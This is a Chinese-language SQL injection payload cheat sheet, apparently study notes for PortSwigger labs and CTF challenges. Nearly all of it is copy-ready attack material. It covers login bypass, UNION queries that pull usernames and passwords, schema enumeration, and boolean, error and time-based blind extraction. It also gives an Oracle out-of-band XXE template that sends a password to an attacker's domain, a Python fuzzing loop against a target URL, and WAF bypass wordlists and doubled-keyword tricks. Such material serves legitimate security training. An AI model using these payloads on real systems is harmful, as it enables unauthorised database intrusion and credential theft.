# SQL 注入 · Payload 速查

> 抄的时候注意：**所有标点必须是半角**（`,` `'` `(` `)` `;`）。
> 不同数据库语法不同，先确认类型（见 `01-原理与识别.md` 第五节）。

---

## 一、登录绕过

### 基础（MySQL / PostgreSQL / Oracle 通用）

```sql
username: administrator'--
password: 随便
```

**拼出来的 SQL：**

```sql
SELECT * FROM users WHERE username='administrator'--' AND password='随便'
                                                    └── 被注释掉
```

### 变体

```sql
' OR 1=1--
' OR '1'='1
admin'--
' OR 1=1#
' OR 1=1/*
```

### 注意

- **`--` 后面要空格**（MySQL 强制，其他数据库宽松）
- `#` 是 MySQL 专用注释，URL 里要编码成 `%23`
- **成功标志：302 + Set-Cookie**（不是 200）

---

## 二、判断列数

```sql
' ORDER BY 1--      → 正常
' ORDER BY 2--      → 正常
' ORDER BY 3--      → 正常
' ORDER BY 4--      → 报错    ← 3 列
```

```sql
' UNION SELECT NULL--               → 报错
' UNION SELECT NULL,NULL--          → 报错
' UNION SELECT NULL,NULL,NULL--     → 正常   ← 3 列
```

---

## 三、找回显列

```sql
' UNION SELECT 'a','b','c'--
```

**页面上哪个字母出现，哪个位置就回显。** 后续把数据放那里。

---

## 四、读数据（UNION）

### 单位置拼接（推荐）

```sql
' UNION SELECT username||'~'||password,NULL,NULL FROM users--
```

**结果：** `administrator~s3cr3t`

| 数据库 | 拼接符 |
|---|---|
| Oracle / PostgreSQL | `\|\|` |
| MySQL | `CONCAT(a,'~',b)` 或 `\|\|` |
| SQL Server | `+` |

### 多位置分列

```sql
' UNION SELECT username,password,NULL FROM users--
```

**只适合「两列都回显」的情况。**

### 多行数据（一次只回一行）

```sql
-- PostgreSQL / MySQL
' UNION SELECT username,password,NULL FROM users LIMIT 1 OFFSET 0--
' UNION SELECT username,password,NULL FROM users LIMIT 1 OFFSET 1--

-- Oracle
' UNION SELECT username,password,NULL FROM users WHERE ROWNUM=1--
```

---

## 五、枚举结构

### MySQL / PostgreSQL

```sql
-- 所有表名
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--

-- 某表的列名
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns
  WHERE table_name='users'--
```

### Oracle（注意全大写）

```sql
-- 表名
' UNION SELECT table_name,NULL,NULL FROM all_tables--
-- 列名
' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

---

## 六、盲注 · 条件响应型（看页面内容）

**适用：页面有 "Welcome back" 之类的条件文字。**

### 通道验证

```sql
' AND '1'='1        → 显示 Welcome back    ← 真
' AND '1'='2        → 不显示               ← 假
```

### 确认表存在

```sql
' AND (SELECT 'a' FROM users LIMIT 1)='a
```

### 确认用户存在

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

### 测长度

```sql
' AND LENGTH((SELECT password FROM users WHERE username='administrator'))>1
```

**把 `>1` 递增到「不再显示」，临界值就是长度。**

### 取字符（等值，适合爆破）

```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a
```

### 取字符（二分，更快）

```sql
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))>77
```

**真 → 在右半区；假 → 在左半区。**

---

## 七、盲注 · 条件错误型（看状态码）

**适用：页面内容没差异，但错误时返回 500。**

### 通道验证（Oracle）

```sql
' AND (SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--   → 500
' AND (SELECT CASE WHEN 1=2 THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--   → 200
```

### 通道验证（PostgreSQL / MySQL）

```sql
' AND (SELECT CASE WHEN 1=1 THEN 1/0 ELSE 'a' END)='a'--
```

### 测长度

```sql
'and(select case when(length(password)>20)
      then to_char(1/0) else 'a' end
      from users where username='administrator')='a'--
```

### 取字符（ASCII 二分，推荐）

```sql
'and(select case when(
   ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1))>77
 ) then to_char(1/0) else 'a' end from dual)='a'--
```

### Oracle 的三个特殊点

| 点 | 说明 |
|---|---|
| **`SUBSTR`** | 不是 `SUBSTRING` |
| **`TO_CHAR(1/0)`** | CASE 分支类型要一致，否则 `ORA-00932` |
| **`FROM dual`** | 只放常量时用；引用 users 的列必须 `FROM users` |

---

## 八、盲注 · 时间型（看响应耗时）

**适用：页面内容、状态码全都一样。**

### 通道验证

```sql
-- PostgreSQL
' AND (SELECT 1 FROM pg_sleep(5))--

-- MySQL
' AND SLEEP(5)--

-- Oracle
' AND (SELECT 1 FROM (SELECT dbms_pipe.receive_message(('a'),5) FROM dual))--
```

### 取字符（PostgreSQL 示例）

```sql
' AND (SELECT CASE WHEN (ASCII(SUBSTRING(password,1,1))>77)
       THEN pg_sleep(5) ELSE pg_sleep(0) END
       FROM users WHERE username='administrator')--
```

**延迟 5 秒 = 真；立刻返回 = 假。**

---

## 九、注释与编码

### 注释符

| 符号 | 适用 | 注意 |
|---|---|---|
| `-- ` | 通用 | **MySQL 要求后面有空格** |
| `#` | MySQL | URL 里编码成 `%23` |
| `/* */` | 通用 | 块注释 |
| `/*! */` | MySQL | 内联注释，内容会执行 |

### 常用 URL 编码

| 字符 | 编码 | 什么时候需要 |
|---|---|---|
| `'` | `%27` | 放进 URL 参数时 |
| 空格 | `%20` 或 `+` | URL 参数；Cookie 里理论上也需要 |
| `#` | `%23` | MySQL 注释符 |
| `-- ` | `--%20` | 注释符带空格 |

**在 Burp Repeater 里通常可以直接写明文，不需要编码。**

---

## 十、常用函数表

| 用途 | Oracle | PostgreSQL | MySQL |
|---|---|---|---|
| 取子串 | `SUBSTR(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` |
| 长度 | `LENGTH(s)` | `LENGTH(s)` | `LENGTH(s)` / `CHAR_LENGTH(s)` |
| 字符编码 | `ASCII(c)` | `ASCII(c)` | `ASCII(c)` |
| 拼接 | `a\|\|b` | `a\|\|b` | `CONCAT(a,b)` |
| 当前库 | — | `current_database()` | `database()` |
| 版本 | `banner FROM v$version` | `version()` | `@@version` |
| 睡眠 | `dbms_pipe.receive_message(('a'),5)` | `pg_sleep(5)` | `SLEEP(5)` |
| 转字符串 | `TO_CHAR(x)` | `x::text` | `CAST(x AS CHAR)` |
| 注释 | `--` | `--` | `-- ` / `#` |
| 空表 | `dual` | — | — |

---

## 十一、一定要先做的两条验证

### ① 引号能不能打断

```
?param=1'       →  500 / 报错  →  有字符串型注入
```

### ② 注释能不能收尾

```
?param=1'--     →  200 正常    →  可以用 -- 收尾
```

**这两条不过，后面的 payload 全是白搭。**

---

## 十二、可见错误注入（Verbose Error）

> 前提：应用把数据库报错原文显示在页面上。
>
> **完整原理、四数据库详解、分片公式、WAF 绕过见 `07-报错注入专题.md`。**
> 本节只放「抄起来就能用」的 payload。

**先花 5 秒测报错会不会回显:**

```sql
' and extractvalue(1,'~')--
```

- 返回 `XPATH syntax error: '~'` → ✅ 能用报错注入
- 返回正常页面 → ❌ 改盲注

### 12.1 四个数据库的"报错带数据"

| 数据库 | payload |
|---|---|
| **PostgreSQL** | `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` |
| **MySQL** | `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))--` |
| **MySQL**（备选） | `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)),1)--` |
| **MySQL**（备选2） | `' AND GEOMETRYCOLLECTION((SELECT password FROM users LIMIT 1))--` |
| **SQL Server** | `' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--` |
| **Oracle** | `' AND 1=(SELECT UPPER(XMLType(CHR(60)\|\|CHR(58)\|\|CHR(58)\|\|(SELECT password FROM users WHERE rownum=1)\|\|CHR(62))) FROM dual)--` |

**报错里会出现你的数据，例如：**

```
PostgreSQL: invalid input syntax for type integer: "s3cr3t"
MySQL     : XPATH syntax error: '~s3cr3t'
SQL Server: Conversion failed when converting the varchar value 's3cr3t' to data type int
Oracle    : ORA-31011 ... LPX-00225 ... s3cr3t
```

### 12.2 为什么 `AND` 后面要接 `1=`

```sql
' AND CAST(...)          -- ❌ 报错:argument of AND must be type boolean
' AND 1=CAST(...)        -- ✅ CAST 返回数字，和 1 比较得到布尔
```

### 12.3 数据被截断怎么办

**报错里的查询有长度上限，payload 太长会被剪掉。**

**⚠️ MySQL 的 `extractvalue` 一次只回 31 个数据字符（`~` 占 1 个，总共 32）：**

```sql
-- 第 1~31
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT LEFT(password,31) FROM users LIMIT 1)))--

-- 第 32~62
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT RIGHT(LEFT(password,62),31) FROM users LIMIT 1)))--
```

**通用分片公式：`right(left(数据, 结束位置), 31)`**

**PostgreSQL 的可见错误则是另一种截断:**

```sql
-- 用 LIMIT 1 代替长的 WHERE 条件
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

-- 分段取
' AND 1=CAST((SELECT SUBSTRING(password,1,10) FROM users LIMIT 1) AS int)--
```

**报错里的 `position N` 能告诉你被截断在哪，据此缩短 payload。**

---

## 十三、时间盲注（四数据库完整版）

### 13.1 各数据库的延迟函数

| 数据库 | 延迟语句 |
|---|---|
| **PostgreSQL** | `pg_sleep(5)` |
| **MySQL** | `SLEEP(5)` |
| **SQL Server** | `WAITFOR DELAY '0:0:5'` |
| **Oracle** | `dbms_pipe.receive_message(('a'),5)` |

### 13.2 通道验证（每库一条）

**PostgreSQL**

```sql
';select case when (1=1) then pg_sleep(5) else pg_sleep(0) end--
```

**MySQL**

```sql
';select case when (1=1) then sleep(5) else sleep(0) end--
```

**SQL Server（有 IF 语句）**

```sql
';if (1=1) waitfor delay '0:0:5'--
```

**Oracle**

```sql
' and case when (1=1) then dbms_pipe.receive_message(('a'),5) else 0 end=1--
```

### 13.3 取数据（二分）

**PostgreSQL**

```sql
';select case when (substring((select password from users where username='administrator'),1,1)>'m')
  then pg_sleep(5) else pg_sleep(0) end--
```

**每库只需换：延迟函数 + 子串函数**

| 数据库 | 子串 | 长度 |
|---|---|---|
| PostgreSQL / MySQL | `substring(s,1,1)` | `length(s)` |
| SQL Server | `substring(s,1,1)` | `len(s)` |
| Oracle | `substr(s,1,1)` | `length(s)` |

### 13.4 三个必须记住的点

```
① 时间盲注必须【串行】，并发会互相干扰计时
② 阈值 = 基准延迟 + 延迟值×0.55，不要用绝对秒数
③ 跑完一定要发一条"整串比对"验证
```

---

## 十四、带外（OOB）盲注

> 完整说明见 `06-OOB带外注入.md`，这里只放速查。

### 14.1 四库一句话

| 数据库 | 触发方式 | 需要特权 |
|---|---|---|
| Oracle | `xmltype` + `EXTRACTVALUE`（XXE） | ❌ 不需要 |
| SQL Server | `xp_dirtree` 访问 UNC 路径 | 通常可用 |
| PostgreSQL | `COPY ... TO PROGRAM 'nslookup ...'` | ✅ 需要 |
| MySQL | `INTO OUTFILE '\\\\域名\\a'` | 仅 Windows |

### 14.2 Oracle 模板（PortSwigger 那几关）

```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.你的域名/">
    %remote;]>'),'/l') FROM dual--
```

### 14.3 编码：`%` 必须最先转

| 字符 | 编码 |
|---|---|
| `%` | **`%25`**（**先做这一步**） |
| 空格 | `+` |
| `"` | `%22` |
| `;` | `%3B` |

---

## 十五、卡住时的排查顺序

```
□ 引号配对了吗?(算上应用补的那个)
□ 括号配对了吗?
□ 标点是半角吗?
□ 列数和原查询一致吗?
□ 表名/列名抄全了吗?(随机后缀容易漏)
□ 数据库函数用对了吗?(SUBSTR vs SUBSTRING)
□ -- 后面有空格吗?(MySQL)
□ 是不是 lab 过期了?(504)
□ 延迟语句对了吗?(pg_sleep / SLEEP / WAITFOR / dbms_pipe)
□ IF 是 MSSQL 的,PostgreSQL 要用 CASE
□ Cookie 里的分号编码成 %3B 了吗?
```

**详细案例见 `03-卡点复盘.md`。**

---

## 十六、WAF fuzz 字典（Burp Intruder 用）

**字典文件：`sqli-fuzz-payloads.txt`（137 行，一行一个 payload）**

### 16.1 字典结构

| 段落 | 行号 | 行数 | 内容 | 用来测什么 |
|---|---|---|---|---|
| **① 关键字** | 1–62 | 62 | `and` `or` `union` `select` `extractvalue` `substr` … | 哪些**词**被拉黑 |
| **② 符号** | 63–88 | 26 | `'` `#` `--` `/**/` `=` `<` `\|\|` … | 哪些**符号**被拉黑 |
| **③ 编码** | 89–98 | 10 | `%20` `%09` `%0a` `%a0` … | 哪些**空白**能过 |
| **④ 组合写法** | 99–114 | 16 | `and(1=1)` `or/**/1=1` `/*!50000union*/` … | 哪些**绕过写法**可用 |
| **⑤ 完整 payload** | 115–131 | 17 | `' or 1=1#` `1' union select 1,2,3#` … | 整体能不能打 |
| **⑥ 数值型** | 132–137 | 6 | `1 and 1=1` `1 order by 3` … | 数字型注入点 |

### 16.2 在 Burp 里怎么用

```
① 抓一个正常请求 → Send to Intruder
② 把注入点用 § 包起来:

   GET /check.php?username=admin&password=2'§§%23 HTTP/1.1

   或者数值型:
   GET /product?productId=1§§ HTTP/1.1

③ Payloads 标签页:
   · Payload type: Simple list
   · Payload settings → Load → 选 sqli-fuzz-payloads.txt
   · ☑ URL-encode these characters: 空格 # % & +  (重要!)

④ Settings → Grep - Extract 或 Grep - Match
   · 加上特征词,比如 "error" / "XPATH" / "臭弟弟"

⑤ Start attack,然后按响应长度排序
```

**⚠️ Community 版 Intruder 有限速,100 多条要几分钟。**
**急的话用 Python 循环(见 `time_blind_generic.py` 的请求部分)或 ffuf。**

### 16.3 怎么判读结果

**只看三样：响应长度、状态码、特征词。**

**以 [极客大挑战 2019]HardSQL 为例：**

| 响应 | 长度 | 含义 |
|---|---|---|
| `Login Success!!` | 550 | payload **生效且条件为真** |
| `NO,Wrong username password` | 564 | payload 生效但条件为假 |
| `XPATH syntax error: '~...'` | 667 | **报错注入成功，数据在报错里** |
| `You have an error in your SQL syntax` | 789 | **词没被拦**，只是语法不完整 |
| **`你可别被我逮住了，臭弟弟`** | **531** | **⛔ 被 WAF 拦了** |

**判读口诀：**

```
同一种长度大量重复 = 那批词都被拦(或都报同样的错)
长度有变化       = 变化的那几条是"特殊"的,重点看
```

### 16.4 拿到结果之后

**把被拦的词列出来,逐个找等价替代:**

| 被拦 | 替代 |
|---|---|
| `and` | `or`、`&&`(也可能被拦) |
| `=` | `like`、`regexp`、`in`、`between` |
| `<` `>` | `like`(配合 `%` 通配)、`greatest`/`least` |
| `substr`/`substring`/`mid` | `left`/`right`、`insert`、`lpad` |
| `count(*)` | `group_concat` |
| `union` | 报错注入、盲注 |
| `sleep` | `benchmark`、`get_lock` |
| 空格 | `(` `)` 分词、`/**/`、`%09`、`%0a` |
| `/**/` | 换 `%09`/`%0a`,或彻底不写空格 |
| `information_schema` | `mysql.innodb_table_stats`(MySQL 5.7+) |

**核心思路:关键字拦了换函数,函数拦了换写法,符号拦了换语义。**

### 16.5 一条命令替代 Intruder

**不想开 Burp?用 Python 跑同一份字典:**

```python
import requests
url = "http://TARGET/check.php"
base = {"username": "admin", "password": "2'{}%23"}
for line in open("sqli-fuzz-payloads.txt", encoding="utf-8"):
    p = line.rstrip("\n")
    r = requests.get(url, params={"username": "admin", "password": f"2'{p}%23"}, timeout=10)
    print(f"{len(r.text):5d}  {p}")
```

**按长度排序,一眼看出哪些是"特殊"的。**

---

### 16.6 第二条字典:绕过变体（193 行）

**文件：`sqli-fuzz-bypass.txt`**

**用途不同 —— 第一条测"哪些词被拦",这条测"WAF 是哪种拦法"。**

| 段落 | 行号 | 内容 | 例子 |
|---|---|---|---|
| **① 大小写变体** | 1–90 | 每个关键词 3 种大小写形态 | `And` `AND` `aNd` `Select` `sElEcT` |
| **② 双写变体** | 91–150 | 关键词写两遍（重叠） | `aandnd` `oorr` `ununionion` `selselectect` `frfromom` |
| **③ 双写+大小写** | 151–162 | 两者组合 | `Ununionion` `uNiOn` |
| **④ 其他绕过** | 163–193 | 注释 / 编码 / null 字节 | `sel/**/ect` `/*!50000select*/` `%53elect` `sel%00ect` |

#### 双写为什么有用（核心）

```python
"selselectect".replace("select", "", 1)  →  "select"
```

**如果 WAF 是这么实现的（删除型）:**

```php
$sql = preg_replace('/select/i', '', $input);   // 删掉一次
```

**你写 `selselectect` → 被删成 `select` → 照样执行 ✅**

**如果 WAF 是这么实现的（拦截型）:**

```php
if (preg_match('/select/i', $input)) die('blocked');   // 直接拦
```

**你写 `selselectect` 仍含 `select` 子串 → 还是拦 ❌**

**→ 「双写能不能过」直接告诉你 WAF 是"删"还是"拦"。**

**这是这份字典最大的价值 —— 它测的不是"哪个词被拦",而是"WAF 的实现方式"。**

#### 大小写变体的意义

| WAF 写法 | `sElEcT` 能过吗 |
|---|---|
| `preg_match('/select/i')` | ❌ 不能（`/i` 忽略大小写） |
| `strpos($x,'select')` | ✅ **能过**（区分大小写） |

**大多数 WAF 都带 `/i`，但总有人写错 —— 一条一条试比猜快。**

#### 使用顺序

```
① 先用 sqli-fuzz-payloads.txt 找出"被拦的词"
② 再用 sqli-fuzz-bypass.txt 对"被拦的词"逐个试绕过
③ 哪个变体能过,就用那种写法重写 payload
```

**⚠️ 别一上来就全套绕过字典 —— 先知道拦了什么，再针对性绕。**

#### 双写的构造规律

**把关键词在"自己的中间"再插一遍:**

| 关键词 | 双写形式 | 删一次后 |
|---|---|---|
| `or` | `oorr` | `or` |
| `and` | `aandnd` | `and` |
| `union` | `ununionion` | `union` |
| `select` | `selselectect` | `select` |
| `from` | `frfromom` | `from` |
| `where` | `whewherere` | `where` |

**构造公式:`w[:k] + w + w[k:]`，k 取中间某个位置。**

**⚠️ 特殊:`information_schema` 里含 `or`** —— WAF 删 `or` 会把它毁掉，所以要写成 `infoorrmation_schema`（删一次 `or` 正好还原）。

